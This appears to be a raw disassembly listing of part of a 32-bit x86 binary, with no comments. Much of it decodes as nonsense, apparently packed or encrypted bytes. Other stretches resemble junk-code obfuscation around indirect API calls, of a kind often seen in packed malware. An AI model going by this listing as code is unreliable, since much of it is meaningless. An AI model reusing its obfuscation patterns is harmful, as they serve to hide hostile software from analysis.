  412481:	adc    eax,0xacf86180
  412486:	sbb    edi,DWORD PTR [edx]
  412488:	fidivr DWORD PTR [ecx]
  41248a:	xchg   DWORD PTR [edi+0x45],ebx
  41248d:	jmp    0x41db:0x90465d4f
  412494:	xor    al,0x63
  412496:	mov    ch,0xe0
  412498:	mov    al,ds:0x51f6755
  41249d:	sbb    al,0xdc
  41249f:	cwde   
  4124a0:	jmp    0xa4441d3a
  4124a5:	jns    0x412462
  4124a7:	pusha  
  4124a8:	fadd   QWORD PTR [ebx]
  4124aa:	mov    cl,0x54
  4124ac:	dec    ebp
  4124ad:	jp     0x412524
  4124af:	hlt    
  4124b0:	add    edi,DWORD PTR [esi+0xb]
  4124b3:	push   esp
  4124b4:	push   0x60
  4124b6:	add    edx,DWORD PTR [esi+esi*4-0x56]
  4124ba:	jg     0x412502
  4124bc:	xchg   esi,eax
  4124bd:	stc    
  4124be:	ds pusha 
  4124c0:	mov    ebx,0xfaf36963
  4124c5:	ret    
  4124c6:	lea    esp,[ebx+0x5597ac2f]
  4124cc:	inc    ebx
  4124cd:	and    ebx,DWORD PTR [esi-0x3522cb35]
  4124d3:	sub    al,0x9d
  4124d5:	aaa    
  4124d6:	clc    
  4124d7:	dec    eax
  4124d8:	ror    DWORD PTR [edi],cl
  4124da:	loope  0x4124ed
  4124dc:	aas    
  4124dd:	mov    ds:0x1da8e631,eax
  4124e2:	rol    DWORD PTR [edi+0x43742796],1
  4124e8:	inc    eax
  4124e9:	test   BYTE PTR [edx+0x4830a783],dh
  4124ef:	sub    BYTE PTR [edi],ah
  4124f1:	sub    DWORD PTR [ebx+0x74e4e2d6],edx
  4124f7:	push   ecx
  4124f8:	mov    eax,eax
  4124fa:	outs   dx,DWORD PTR ds:[esi]
  4124fb:	dec    ebp
  4124fc:	(bad)
  4124ff:	mov    ds:0x36c731a8,eax
  412504:	test   BYTE PTR [ebx-0x4190cad9],bh
  41250a:	cmp    ch,BYTE PTR [edx+0x4f9d18b8]
  412510:	push   0x942487ee
  412515:	rol    DWORD PTR [ebx+0x60fa5dc8],cl
  41251b:	(bad)  
  41251c:	jmp    0x4626:0x30bbc7c4
  412523:	pop    ss
  412524:	mov    edi,DWORD PTR [ebp+0x4563ed0e]
  41252a:	lods   al,BYTE PTR ds:[esi]
  41252b:	inc    eax
  41252c:	aaa    
  41252d:	mov    ebx,0xa6501fef
  412532:	fnstcw WORD PTR [edx]
  412534:	mov    eax,ds:0x986216db
  412539:	pop    ss
  41253a:	cli    
  41253b:	ins    DWORD PTR es:[edi],dx
  41253c:	fs push ebp
  41253e:	pop    edi
  41253f:	test   DWORD PTR [eax],0xb73ed603
  412545:	sub    eax,0x6b516259
  41254a:	xchg   esp,eax
  41254b:	adc    eax,DWORD PTR [ecx-0x31f3df9a]
  412551:	jecxz  0x4125a7
  412553:	jle    0x412557
  412555:	and    al,0xe4
  412557:	enter  0x59ec,0x97
  41255b:	inc    ebp
  41255c:	cmp    DWORD PTR [edx-0x56],0xe834e44f
  412563:	mov    al,ds:0xcce52ed
  412568:	sahf   
  412569:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41256a:	frstor [ebx-0x1b]
  41256d:	cwde   
  41256e:	push   es
  41256f:	mov    ch,0xba
  412571:	mov    cl,0x7d
  412573:	hlt    
  412574:	jge    0x4125d0
  412576:	mov    al,0x48
  412578:	out    dx,al
  412579:	pop    DWORD PTR [eax-0x72666c3a]
  41257f:	xchg   ecx,eax
  412580:	iret   
  412581:	push   es
  412582:	push   esp
  412583:	aaa    
  412584:	mov    esi,0x1e5c1204
  412589:	js     0x412525
  41258b:	xor    al,0xf4
  41258d:	or     eax,0xa676d9d8
  412592:	xchg   ebp,eax
  412593:	bound  ebp,QWORD PTR ss:[ecx+0x4e4759c5]
  41259a:	jbe    0x412583
  41259c:	jle    0x4125db
  41259e:	xor    eax,0x53d3a0a0
  4125a3:	jg     0x4125b6
  4125a5:	out    0xc4,al
  4125a7:	sub    eax,0xbb518866
  4125ac:	or     BYTE PTR [edx-0x3b1b0b95],bl
  4125b2:	and    ebp,ecx
  4125b4:	and    al,0x97
  4125b6:	sti    
  4125b7:	imul   edi,DWORD PTR [ecx],0x2c6e7760
  4125bd:	popa   
  4125be:	xchg   ebp,eax
  4125bf:	jns    0x4125bf
  4125c1:	outs   dx,BYTE PTR ds:[esi]
  4125c2:	sbb    BYTE PTR [edi+0x68],ch
  4125c5:	sbb    eax,0x2903d615
  4125ca:	mov    esp,0xd6503640
  4125cf:	lock cld 
  4125d1:	mov    ebp,esp
  4125d3:	adc    ebx,ebx
  4125d5:	xor    ah,BYTE PTR [ebp+0x61]
  4125d8:	pop    ecx
  4125d9:	int    0xa3
  4125db:	sahf   
  4125dc:	push   esp
  4125dd:	call   0xc1f3:0x239f0604
  4125e4:	shl    ah,1
  4125e6:	mov    al,ds:0x9c33fca4
  4125eb:	jge    0x412610
  4125ed:	bound  esp,QWORD PTR [ecx+eiz*1]
  4125f0:	mov    edi,0x3e52435c
  4125f5:	outs   dx,BYTE PTR ds:[esi]
  4125f6:	das    
  4125f7:	or     eax,0xff653d45
  4125fc:	js     0x412592
  4125fe:	mov    ds:0x31b8b4a1,eax
  412603:	jl     0x412591
  412605:	imul   ecx,DWORD PTR [ebp+edx*2+0x28],0x962e7f6
  41260d:	fcmovnb st,st(3)
  41260f:	les    edx,FWORD PTR [edi-0x6f281588]
  412615:	pop    es
  412616:	mov    ecx,0xd5f184f0
  41261b:	jge    0x41268c
  41261d:	or     al,0xf2
  41261f:	std    
  412620:	cli    
  412621:	jbe    0x412638
  412623:	loopne 0x412618
  412625:	std    
  412626:	stos   BYTE PTR es:[edi],al
  412627:	push   ds
  412628:	mov    bh,cl
  41262a:	or     ebx,DWORD PTR [edx+edx*1]
  41262d:	xor    BYTE PTR [eax+0x7f3df8a9],ch
  412633:	sub    eax,0x218617ec
  412638:	pop    ecx
  412639:	cli    
  41263a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41263b:	(bad)  [ebp+0x3da92f4]
  412641:	out    0xeb,eax
  412643:	ror    DWORD PTR [edi],1
  412645:	lods   al,BYTE PTR ds:[esi]
  412646:	in     eax,dx
  412647:	pop    ebp
  412648:	cdq    
  412649:	jns    0x4126b4
  41264b:	sbb    al,BYTE PTR [eax-0x6d814afe]
  412651:	push   esp
  412652:	nop
  412653:	mov    ebx,0xf4f340a0
  412658:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412659:	sub    DWORD PTR [esi-0xa],edi
  41265c:	stc    
  41265d:	pushf  
  41265e:	sbb    BYTE PTR [ebp-0xb466f7f],bl
  412664:	fild   WORD PTR [edi+edx*1]
  412667:	mov    eax,0x7ca2e9bd
  41266c:	mov    edi,0x791aa3c0
  412671:	std    
  412672:	out    dx,eax
  412673:	mov    cl,0x28
  412675:	mov    cl,0xe3
  412677:	sbb    bh,bh
  412679:	jb     0x412674
  41267b:	dec    esp
  41267c:	ss cwde 
  41267e:	adc    bh,BYTE PTR [eax+eiz*1+0x679f0943]
  412685:	shl    DWORD PTR [ecx],cl
  412687:	jmp    0xeb0b8e92
  41268c:	push   esi
  41268d:	push   edi
  41268e:	xor    DWORD PTR ds:0x428555,edx
  412694:	mov    eax,DWORD PTR [ebp+0x8]
  412697:	add    ebx,DWORD PTR ds:0x428351
  41269d:	mov    ecx,DWORD PTR [ebp+0xc]
  4126a0:	and    ebx,DWORD PTR ds:0x428549
  4126a6:	shrd   eax,ecx,0x2
  4126aa:	xor    esi,DWORD PTR ds:0x428565
  4126b0:	shr    ecx,0x2
  4126b3:	mov    ecx,DWORD PTR [ebp+0x8]
  4126b6:	cmp    DWORD PTR ds:0x4284cd,0x0
  4126bd:	not    ebx
  4126bf:	mov    edi,0x75d4
  4126c4:	mov    DWORD PTR ds:0x42855d,0x68f
  4126ce:	mov    DWORD PTR ds:0x428569,0x72ee
  4126d8:	jmp    0x412740
  4126dd:	mov    esi,DWORD PTR ds:0x428419
  4126e3:	mov    DWORD PTR ds:0x428369,0x6012
  4126ed:	cmp    DWORD PTR ds:0x4284cd,0x0
  4126f4:	jg     0x41272a
  4126fa:	push   0x1b53
  4126ff:	push   0x62ef
  412704:	call   DWORD PTR ds:0x42e008
  41270a:	and    edi,0x6509
  412710:	xor    edx,edx
  412712:	add    edx,DWORD PTR ds:0x428561
  412718:	and    edx,DWORD PTR ds:0x428501
  41271e:	mov    DWORD PTR ds:0x428561,edx
  412724:	and    edi,DWORD PTR ds:0x428351
  41272a:	adc    DWORD PTR ds:0x428339,edi
  412730:	add    DWORD PTR ds:0x428571,edi
  412736:	mov    DWORD PTR ds:0x428469,0x7a33
  412740:	mov    edx,DWORD PTR [ebp+0xc]
  412743:	cmp    DWORD PTR ds:0x428449,0x0
  41274a:	mov    DWORD PTR ds:0x428331,0x5b58
  412754:	not    ebx
  412756:	mov    DWORD PTR ds:0x42845d,0x50a2
  412760:	mov    DWORD PTR ds:0x428431,edx
  412766:	jmp    0x4127b4
  41276b:	mov    DWORD PTR ds:0x428569,0x3c96
  412775:	cmp    DWORD PTR ds:0x428449,0x0
  41277c:	jne    0x41279e
  412782:	push   0x4282b5
  412787:	push   DWORD PTR [ebp-0x1c]
  41278a:	call   DWORD PTR ds:0x42e0cc
  412790:	and    DWORD PTR ds:0x428431,edi
  412796:	neg    DWORD PTR ds:0x428345
  41279c:	not    edi
  41279e:	sbb    DWORD PTR ds:0x42836d,edx
  4127a4:	sub    edi,ebx
  4127a6:	or     DWORD PTR ds:0x428449,ebx
  4127ac:	xor    esi,esi
  4127ae:	or     DWORD PTR ds:0x428335,ecx
  4127b4:	xor    edx,edx
  4127b6:	mov    esi,0x32de6d5d
  4127bb:	sub    DWORD PTR ds:0x42835d,ecx
  4127c1:	xor    eax,esi
  4127c3:	or     eax,edx
  4127c5:	mov    DWORD PTR [ebp-0x34],eax
  4127c8:	cmp    DWORD PTR ds:0x428449,0x0
  4127cf:	not    ebx
  4127d1:	mov    edx,0x6453
  4127d6:	mov    ebx,DWORD PTR ds:0x42846d
  4127dc:	mov    edi,DWORD PTR ds:0x42835d
  4127e2:	jmp    0x412823
  4127e7:	mov    edi,0x4ae9
  4127ec:	cmp    DWORD PTR ds:0x428449,0x0
  4127f3:	jbe    0x41280b
  4127f9:	push   0x428369
  4127fe:	call   DWORD PTR ds:0x42e254
  412804:	and    ebx,DWORD PTR ds:0x428425
  41280a:	inc    edx
  41280b:	adc    edx,0x18bc
  412811:	mov    ebx,DWORD PTR ds:0x4284e9
  412817:	or     ebx,DWORD PTR ds:0x428441
  41281d:	mov    DWORD PTR ds:0x4284e9,ebx
  412823:	mov    eax,DWORD PTR [ebp+0x8]
  412826:	shl    ecx,0x1e
  412829:	mov    ecx,DWORD PTR [ebp+0xc]
  41282c:	shrd   eax,ecx,0x2
  412830:	xor    eax,esi
  412832:	add    DWORD PTR ds:0x428439,0x71c1
  41283c:	shr    ecx,0x2
  41283f:	cmp    DWORD PTR ds:0x4284f9,0x0
  412846:	mov    DWORD PTR ds:0x428421,0x17f6
  412850:	mov    DWORD PTR ds:0x428425,ecx
  412856:	jmp    0x41291d
  41285b:	movzx  ecx,WORD PTR ds:0x4284dd
  412862:	cmp    DWORD PTR ds:0x4284f9,0x0
  412869:	jl     0x412892
  41286f:	push   DWORD PTR [ebp-0x10]
  412872:	call   DWORD PTR ds:0x42e0d0
  412878:	sub    DWORD PTR ds:0x42841d,edi
  41287e:	xor    edx,edx
  412880:	or     edx,DWORD PTR ds:0x4283c5
  412886:	mov    edi,DWORD PTR ds:0x428525
  41288c:	sub    edx,edi
  41288e:	sub    edx,DWORD PTR [edx+edi*1]
  412891:	inc    edx
  412892:	inc    edx
  412893:	or     DWORD PTR ds:0x4284c5,0x781a
  41289d:	adc    edi,DWORD PTR ds:0x428555
  4128a3:	sbb    ebx,DWORD PTR ds:0x428565
  4128a9:	cmp    DWORD PTR ds:0x428469,0x0
  4128b0:	mov    DWORD PTR ds:0x4284f5,0x3519
  4128ba:	mov    DWORD PTR ds:0x42856d,edx
  4128c0:	jmp    0x41291d
  4128c5:	mov    edi,DWORD PTR ds:0x428445
  4128cb:	mov    DWORD PTR ds:0x428361,0x6a8c
  4128d5:	cmp    DWORD PTR ds:0x428469,0x0
  4128dc:	jae    0x412909
  4128e2:	push   0x74d4
  4128e7:	push   DWORD PTR [ebp-0x24]
  4128ea:	call   DWORD PTR ds:0x42e00c
  4128f0:	xor    ecx,ecx
  4128f2:	or     ecx,DWORD PTR ds:0x4284b1
  4128f8:	mov    edi,DWORD PTR ds:0x4285bd
  4128fe:	sub    ecx,edi
  412900:	add    ecx,DWORD PTR [ecx+edi*1]
  412903:	xor    DWORD PTR ds:0x428549,ebx
  412909:	add    DWORD PTR ds:0x42855d,edx
  41290f:	sub    edi,DWORD PTR ds:0x4284f9
  412915:	neg    edx
  412917:	sub    ecx,DWORD PTR ds:0x428559
  41291d:	mov    ecx,DWORD PTR [ebp+0x8]
  412920:	cmp    DWORD PTR ds:0x428561,0x0
  412927:	movzx  edx,BYTE PTR ds:0x428411
  41292e:	mov    edi,DWORD PTR ds:0x428451
  412934:	jmp    0x41298c
  412939:	mov    DWORD PTR ds:0x4284ed,0x3a54
  412943:	mov    DWORD PTR ds:0x428345,0x35a1
  41294d:	cmp    DWORD PTR ds:0x428561,0x0
  412954:	jbe    0x412981
  41295a:	push   0x731e
  41295f:	push   DWORD PTR [ebp-0x1c]
  412962:	push   0x5d33
  412967:	push   DWORD PTR [ebp-0x28]
  41296a:	push   DWORD PTR [ebp-0x20]
  41296d:	call   DWORD PTR ds:0x42e0d4
  412973:	and    edx,edi
  412975:	and    DWORD PTR ds:0x4284e5,ebx
  41297b:	sbb    edi,0x47ca
  412981:	inc    edx
  412982:	add    DWORD PTR ds:0x428345,0x615e
  41298c:	mov    edx,DWORD PTR [ebp+0xc]
  41298f:	xor    ebx,ebx
  412991:	add    ebx,DWORD PTR ds:0x428391
  412997:	mov    edi,DWORD PTR ds:0x42858d
  41299d:	sub    edi,ebx
  41299f:	or     ebx,DWORD PTR [ebx+edi*1]
  4129a2:	xor    edx,edx
  4129a4:	xor    DWORD PTR ds:0x428469,ebx
  4129aa:	or     eax,edx
  4129ac:	adc    edx,0x4918
  4129b2:	mov    DWORD PTR [ebp-0x34],eax
  4129b5:	sub    ebx,edx
  4129b7:	mov    eax,ds:0x422588
  4129bc:	mov    eax,DWORD PTR [eax]
  4129be:	mov    DWORD PTR [ebp-0x28],eax
  4129c1:	mov    eax,ds:0x4227a8
  4129c6:	mov    eax,DWORD PTR [eax]
  4129c8:	xor    edx,edx
  4129ca:	mov    DWORD PTR [ebp-0x20],eax
  4129cd:	mov    ebx,DWORD PTR ds:0x42849d
  4129d3:	mov    ebx,DWORD PTR [ebx]
  4129d5:	sub    DWORD PTR ds:0x4284dd,ebx
  4129db:	mov    eax,DWORD PTR [ebp-0x28]
  4129de:	mov    eax,DWORD PTR [ebp-0x28]
  4129e1:	xor    edx,edx
  4129e3:	mov    ebx,DWORD PTR [ebp+0x8]
  4129e6:	movzx  edx,BYTE PTR ds:0x4284d5
  4129ed:	sbb    DWORD PTR ds:0x428361,edx
  4129f3:	shl    ecx,0x1e
  4129f6:	mov    edi,DWORD PTR ds:0x42833d
  4129fc:	adc    DWORD PTR ds:0x428375,edi
  412a02:	xor    ecx,ecx
  412a04:	and    DWORD PTR ds:0x428335,ecx
  412a0a:	shld   ecx,eax,0x2
  412a0e:	jmp    0x412d47
  412a13:	scas   eax,DWORD PTR es:[edi]
  412a14:	cdq    
  412a15:	and    esp,ecx
  412a17:	sub    edi,DWORD PTR [eax+esi*4-0x64]
  412a1b:	push   ecx
  412a1c:	mov    edx,0x98b190d1
  412a21:	mov    dl,0xcf
  412a23:	pop    esp
  412a24:	jb     0x4129e4
  412a26:	mov    esi,0xbebec4ed
  412a2b:	inc    ebp
  412a2c:	adc    DWORD PTR [eax+0x63cc94c1],ebx
  412a32:	fistp  WORD PTR [edx+esi*4+0x4c]
  412a36:	push   0xffffff86
  412a38:	inc    ecx
  412a39:	(bad)  
  412a3a:	xchg   ebp,eax
  412a3b:	add    DWORD PTR [edi+0x43cc8ccb],esp
  412a41:	or     ebp,esi
  412a43:	mov    gs,WORD PTR [edx-0x21a22cb]
  412a49:	jae    0x4129e8
  412a4b:	pop    ebx
  412a4c:	xchg   ebp,eax
  412a4d:	je     0x4129e7
  412a4f:	sub    al,0x61
  412a51:	cmp    eax,0x75b04443
  412a56:	call   0xd3435bfe
  412a5b:	mov    ds:0x29b24add,al
  412a60:	mov    ah,0x5a
  412a62:	outs   dx,BYTE PTR ds:[esi]
  412a63:	sbb    bh,BYTE PTR [ecx]
  412a65:	or     eax,0x9cb58ae5
  412a6a:	in     al,dx
  412a6b:	lods   eax,DWORD PTR ds:[esi]
  412a6c:	popa   
  412a6d:	(bad)  [ebp+0x4b6453fe]
  412a73:	js     0x412a0c
  412a75:	inc    ebx
  412a76:	rol    BYTE PTR [edx-0x69a82131],cl
  412a7c:	or     DWORD PTR [edi-0x62],ebx
  412a7f:	popa   
  412a80:	inc    edi
  412a81:	lock or BYTE PTR [ecx+0x25],ah
  412a85:	and    al,0x9f
  412a87:	adc    al,0x1a
  412a89:	or     eax,0x2f941a7d
  412a8e:	cld    
  412a8f:	jle    0x412abd
  412a91:	cmp    eax,0xb9b1bee2
  412a96:	push   cs
  412a97:	dec    esp
  412a98:	loopne 0x412ac7
  412a9a:	enter  0xdad9,0x39
  412a9e:	inc    edx
  412a9f:	cwde   
  412aa0:	sbb    DWORD PTR [ebx],ebp
  412aa2:	popf   
  412aa3:	jle    0x412b16
  412aa5:	outs   dx,DWORD PTR ds:[esi]
  412aa6:	jns    0x412ae1
  412aa8:	out    dx,eax
  412aa9:	mov    esi,0x80218229
  412aae:	mov    eax,ds:0xbf943512
  412ab3:	sar    ch,0x89
  412ab6:	stos   DWORD PTR es:[edi],eax
  412ab7:	inc    esi
  412ab8:	or     edi,DWORD PTR [edx+ebp*1-0x7c76074a]
  412abf:	xor    al,0xa3
  412ac1:	iret   
  412ac2:	popf   
  412ac3:	in     eax,0x55
  412ac5:	add    dh,BYTE PTR [eax-0x4064513d]
  412acb:	inc    ebx
  412acc:	mov    ebx,0x6c0b740c
  412ad1:	out    dx,al
  412ad2:	imul   ebx,DWORD PTR [edx+ebx*1+0x541c3d74],0x63
  412ada:	cwde   
  412adb:	(bad)  
  412adc:	cmc    
  412add:	call   0xc4a15fa4
  412ae2:	xor    eax,0x46ed4353
  412ae7:	jo     0x412ab7
  412ae9:	cmp    al,0x68
  412aeb:	dec    ecx
  412aec:	bound  edi,QWORD PTR [ecx]
  412aee:	mov    ecx,DWORD PTR [eax]
  412af0:	ja     0x412b64
  412af2:	mov    bh,0xed
  412af4:	mov    edi,DWORD PTR [eax-0x28]
  412af7:	dec    edx
  412af8:	dec    ebx
  412af9:	hlt    
  412afa:	jnp    0x412a9e
  412afc:	les    esp,FWORD PTR [ebp-0x2e56bb77]
  412b02:	stos   DWORD PTR es:[edi],eax
  412b03:	ins    DWORD PTR es:[edi],dx
  412b04:	pop    ebx
  412b05:	sahf   
  412b06:	xchg   esp,eax
  412b07:	push   edx
  412b08:	in     eax,0x9
  412b0a:	mov    WORD PTR [ebp-0x66bba76b],es
  412b10:	adc    al,0x30
  412b12:	mov    edi,0xe7485df
  412b17:	scas   eax,DWORD PTR es:[edi]
  412b18:	stos   BYTE PTR es:[edi],al
  412b19:	inc    ecx
  412b1a:	adc    al,0x37
  412b1c:	adc    DWORD PTR [ebp-0x7d],0x315de596
  412b23:	inc    ebx
  412b24:	pop    ebx
  412b25:	dec    esp
  412b26:	push   es
  412b27:	xchg   esp,eax
  412b28:	sub    al,0x40
  412b2a:	icebp  
  412b2b:	scas   eax,DWORD PTR es:[edi]
  412b2c:	ss mov eax,0xc70dfb2
  412b32:	les    ebx,FWORD PTR [edi+edx*8-0x1e9afc4]
  412b39:	and    DWORD PTR [eax],0x382e72b6
  412b3f:	cld    
  412b40:	jmp    FWORD PTR [ebp-0x7e7fa39e]
  412b46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b47:	cdq    
  412b48:	out    0x74,eax
  412b4a:	lahf   
  412b4b:	lds    ecx,FWORD PTR [esi]
  412b4d:	ret    
  412b4e:	mov    eax,ds:0x91c7ca7e
  412b53:	pop    eax
  412b54:	nop
  412b55:	jnp    0x412b60
  412b57:	xchg   ebx,eax
  412b58:	rol    BYTE PTR [edi+edx*1+0x3ef79373],cl
  412b5f:	clc    
  412b60:	push   0x6e
  412b62:	jae    0x412af7
  412b64:	shl    DWORD PTR [ecx],1
  412b66:	shl    DWORD PTR [ecx],0x67
  412b69:	pop    ds
  412b6a:	popa   
  412b6b:	pushf  
  412b6c:	adc    edx,DWORD PTR [edi+0x47]
  412b6f:	add    bl,cl
  412b71:	repz sbb al,0x1b
  412b74:	adc    dh,BYTE PTR [esi]
  412b76:	cld    
  412b77:	inc    ebx
  412b78:	in     al,dx
  412b79:	and    al,0xa5
  412b7b:	in     al,dx
  412b7c:	sub    ebp,DWORD PTR [eax+0x63]
  412b7f:	fwait
  412b80:	call   0xe033f62e
  412b85:	dec    edx
  412b86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b87:	es cmc 
  412b89:	xchg   edx,eax
  412b8a:	data16 loopne 0x412b84
  412b8d:	mov    cl,BYTE PTR [edi-0x34]
  412b90:	mov    ds:0xf3bbf8b6,al
  412b95:	mov    al,ds:0x5d9de809
  412b9a:	push   0x48
  412b9c:	cmp    al,BYTE PTR [edi]
  412b9e:	or     al,0xd1
  412ba0:	rcl    BYTE PTR [ebx-0x1],1
  412ba3:	repnz ins DWORD PTR es:[edi],dx
  412ba5:	ja     0x412bbf
  412ba7:	push   es
  412ba8:	sub    al,0xa0
  412baa:	adc    esi,DWORD PTR [eax+edi*4-0x7fd7c3e0]
  412bb1:	(bad)  
  412bb2:	pop    esp
  412bb3:	lds    esi,FWORD PTR [eax+0x3bfc3db3]
  412bb9:	dec    edi
  412bba:	inc    edx
  412bbb:	add    BYTE PTR [ebx+esi*8+0x686f1a65],dh
  412bc2:	push   0xc24dfb11
  412bc7:	adc    al,0xe3
  412bc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bca:	inc    edx
  412bcb:	mov    dl,0xf9
  412bcd:	mov    ds:0xabcebd92,eax
  412bd2:	pop    esp
  412bd3:	imul   edx,esp,0x10bece85
  412bd9:	xchg   ebx,eax
  412bda:	je     0x412bbb
  412bdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bdd:	ins    BYTE PTR es:[edi],dx
  412bde:	cdq    
  412bdf:	sub    eax,0x718c620f
  412be4:	xor    DWORD PTR [ecx-0x69],ebp
  412be7:	hlt    
  412be8:	xor    bl,dl
  412bea:	pop    ebx
  412beb:	enter  0xeea1,0x79
  412bef:	ret    0x1f99
  412bf2:	ss loopne 0x412c69
  412bf5:	add    ecx,DWORD PTR [edx-0x2d05ee20]
  412bfb:	(bad)  
  412bfc:	push   esi
  412bfd:	sbb    ecx,DWORD PTR [edi-0x283fc709]
  412c03:	inc    esp
  412c04:	adc    ecx,ecx
  412c06:	cmp    eax,DWORD PTR [edi]
  412c08:	xchg   dh,dh
  412c0a:	retf   
  412c0b:	mov    BYTE PTR [ebx],ah
  412c0d:	jmp    0x5a43:0x753a98e3
  412c14:	pop    edi
  412c15:	and    DWORD PTR [ebx],0xffffffd1
  412c18:	xchg   BYTE PTR [esi-0x3bcf23f5],dl
  412c1e:	in     al,dx
  412c1f:	mov    ch,0xa
  412c21:	push   esi
  412c22:	and    esi,esp
  412c24:	imul   ecx,DWORD PTR [edx-0x2a],0xffffff86
  412c28:	sub    bh,BYTE PTR ds:0x38de5183
  412c2e:	inc    esp
  412c2f:	jge    0x412c7e
  412c31:	xchg   DWORD PTR [eax+0x5da0bad4],ecx
  412c37:	xor    al,0xd4
  412c39:	dec    esp
  412c3a:	lock faddp st(7),st
  412c3d:	(bad)  
  412c3e:	push   ebx
  412c3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c40:	xchg   BYTE PTR [eax],ch
  412c42:	retf   
  412c43:	cwde   
  412c44:	push   0x39b7cd57
  412c49:	cmp    ebp,DWORD PTR [edi+0xaf56db6]
  412c4f:	jb     0x412bf5
  412c51:	pop    edx
  412c52:	pop    esi
  412c53:	mov    bh,0xee
  412c55:	fcmove st,st(3)
  412c57:	mov    bl,0xf6
  412c59:	cs js  0x412ccb
  412c5c:	push   cs
  412c5d:	fcomp  DWORD PTR [edx]
  412c5f:	mov    ebp,0xea0122b8
  412c64:	loop   0x412cb3
  412c66:	test   DWORD PTR [esi],ebp
  412c68:	adc    BYTE PTR [esi+0x40],cl
  412c6b:	cmc    
  412c6c:	mov    ecx,edx
  412c6e:	cmp    eax,0x48255431
  412c73:	cld    
  412c74:	dec    esp
  412c75:	ror    BYTE PTR ds:0xc939df25,cl
  412c7b:	scas   al,BYTE PTR es:[edi]
  412c7c:	clc    
  412c7d:	sbb    ebx,DWORD PTR [ebx+eiz*8+0x5f]
  412c81:	jae    0x412c32
  412c83:	icebp  
  412c84:	stc    
  412c85:	inc    ebp
  412c86:	dec    ebp
  412c87:	scas   al,BYTE PTR es:[edi]
  412c88:	dec    ebp
  412c89:	jecxz  0x412ca0
  412c8b:	loop   0x412cd6
  412c8d:	xchg   edx,eax
  412c8e:	cld    
  412c8f:	pop    edx
  412c90:	out    dx,eax
  412c91:	xchg   BYTE PTR [edi+0x23c3b4c8],al
  412c97:	push   ecx
  412c98:	sbb    al,0x2d
  412c9a:	xor    BYTE PTR [ebx+esi*2+0x44],ch
  412c9e:	fs jmp 0x412c37
  412ca1:	or     eax,0x999c6f7b
  412ca6:	mov    ah,0xbd
  412ca8:	hlt    
  412ca9:	sub    DWORD PTR [edx],eax
  412cab:	jmp    FWORD PTR [ebx+0x56]
  412cae:	inc    esi
  412caf:	or     ecx,DWORD PTR [ecx+0x60]
  412cb2:	cs mov ebx,0x20686a19
  412cb8:	sahf   
  412cb9:	push   edx
  412cba:	dec    edi
  412cbb:	mov    ch,0xd0
  412cbd:	push   eax
  412cbe:	scas   al,BYTE PTR es:[edi]
  412cbf:	mov    esi,0x1079f04f
  412cc4:	out    0x8b,al
  412cc6:	jge    0x412cfe
  412cc8:	cli    
  412cc9:	jno    0x412c4e
  412ccb:	or     al,0x4a
  412ccd:	arpl   WORD PTR [eax+edx*8-0x7dccf60],di
  412cd4:	cwde   
  412cd5:	aad    0x89
  412cd7:	sub    BYTE PTR [ebx+ecx*2],0x45
  412cdb:	jge    0x412cf0
  412cdd:	mov    ch,0xf9
  412cdf:	cmp    eax,0x8dcda094
  412ce4:	fcom   DWORD PTR [ebx-0x70542bb3]
  412cea:	fucom  st(4)
  412cec:	xchg   esi,eax
  412ced:	jp     0x412cd9
  412cef:	fsubr  QWORD PTR [esi-0xfdfe5d0]
  412cf5:	jecxz  0x412d04
  412cf7:	ins    BYTE PTR es:[edi],dx
  412cf8:	sti    
  412cf9:	mov    eax,ds:0x4d86058d
  412cfe:	mov    al,ds:0xad8054ce
  412d03:	and    bl,BYTE PTR [ecx-0x5d]
  412d06:	ins    DWORD PTR es:[edi],dx
  412d07:	xchg   ebx,eax
  412d08:	cmc    
  412d09:	cmp    al,BYTE PTR ds:0x7a4ebaf1
  412d0f:	or     al,0xaf
  412d11:	les    eax,FWORD PTR [ebp-0x68]
  412d14:	cli    
  412d15:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  412d17:	sub    BYTE PTR [ebx-0x4cf0e9e],dl
  412d1d:	sbb    ebx,DWORD PTR [ecx+0x79811356]
  412d23:	inc    esp
  412d24:	xor    al,BYTE PTR [ecx+eiz*2]
  412d27:	mov    ?,WORD PTR [esi-0x1b]
  412d2a:	stc    
  412d2b:	mov    esi,0x104ced64
  412d30:	lods   eax,DWORD PTR ds:[esi]
  412d31:	shl    esp,0x6d
  412d34:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  412d36:	das    
  412d37:	dec    esi
  412d38:	adc    al,0x65
  412d3a:	mov    eax,0xd474be0f
  412d3f:	pushw  es
  412d41:	popa   
  412d42:	jmp    0x412d56
  412d44:	sub    al,BYTE PTR [edi+0x2e0c10c]
  412d4a:	and    edi,edi
  412d4c:	mov    edi,0xcb79b576
  412d51:	mov    edx,0x9c2b8ae8
  412d56:	mov    DWORD PTR [ebp-0x10],ebx
  412d59:	mov    DWORD PTR ds:0x428465,0xc27
  412d63:	mov    ebx,DWORD PTR [ebp+0xc]
  412d66:	xor    eax,edi
  412d68:	xor    DWORD PTR ds:0x42842d,0x622f
  412d72:	xor    ecx,edx
  412d74:	mov    DWORD PTR ds:0x428465,0x97b
  412d7e:	mov    DWORD PTR [ebp-0x18],0xa5069aae
  412d85:	mov    DWORD PTR ds:0x42857d,0x75c6
  412d8f:	mov    DWORD PTR [ebp-0x1c],0xa50693ae
  412d96:	mov    DWORD PTR [ebp-0xc],ebx
  412d99:	mov    DWORD PTR ds:0x428559,0x6dfc
  412da3:	cmp    eax,DWORD PTR [ebp-0x10]
  412da6:	jne    0x412db4
  412dac:	cmp    ecx,ebx
  412dae:	je     0x414af6
  412db4:	mov    eax,DWORD PTR [ebp-0x20]
  412db7:	sub    eax,0x3b59
  412dbc:	mov    eax,DWORD PTR [ebp-0x20]
  412dbf:	xor    ecx,ecx
  412dc1:	shld   ecx,eax,0x2
  412dc5:	xor    DWORD PTR ds:0x428411,0x4284e9
  412dcf:	shl    eax,0x2
  412dd2:	add    DWORD PTR ds:0x428449,0x4284e1
  412ddc:	xor    ecx,edx
